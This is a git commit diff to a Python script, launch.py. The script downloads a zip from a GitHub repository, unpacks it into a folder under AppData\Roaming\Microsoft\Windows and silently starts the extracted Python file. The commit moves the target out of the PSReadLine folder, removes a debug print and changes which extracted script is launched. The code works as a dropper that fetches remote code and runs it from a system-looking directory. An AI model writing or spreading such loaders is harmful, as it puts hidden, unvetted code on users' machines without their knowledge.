3678c7dae55cf1c5a11dc3ce285ad85e7b0ad3f4
noel-create <ladi.noel20@gmail.com>
2024-09-24 21:31:02 +0200

    Update launch.py

--- launch.py
+++ launch.py
@@ -6,15 +6,14 @@ import requests
 import time
 
 user_profile = os.environ['USERPROFILE']
-target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'PowerShell', 'PSReadLine')
+target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
 os.makedirs(target_path, exist_ok=True)
 
 r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/mainmain.zip", allow_redirects=True)
 file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-mainmain.zip')
 open(file_path, 'wb').write(r.content)
-print(file_path)
 with zipfile.ZipFile(file_path, 'r') as zip_ref:
     zip_ref.extractall(target_path)
 os.remove(file_path)
 
-subprocess.Popen(["python", os.path.join(target_path, "skibidi-mainmain", "main.py")])
+subprocess.Popen(["python", os.path.join(target_path, "skibidi-launch", "launch.py")])
